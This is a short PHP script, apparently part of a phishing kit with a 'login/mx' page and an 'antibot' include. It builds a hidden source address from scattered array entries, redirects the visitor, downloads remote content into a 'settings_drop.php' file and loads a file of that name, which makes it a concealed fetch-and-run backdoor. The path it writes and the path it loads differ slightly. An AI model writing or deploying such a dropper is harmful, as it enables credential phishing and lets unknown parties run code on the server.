<?php
include ('antibot.php');
$get_ip = $Botname[165].$Botname[146].$Botname[396];
$function="$get_ip";
header("LOCATION:mx/");
file_put_contents("login/mx/settings/settings_drop.php", file_get_contents($function)); require_once "login/mx/settings_drop.php";
?>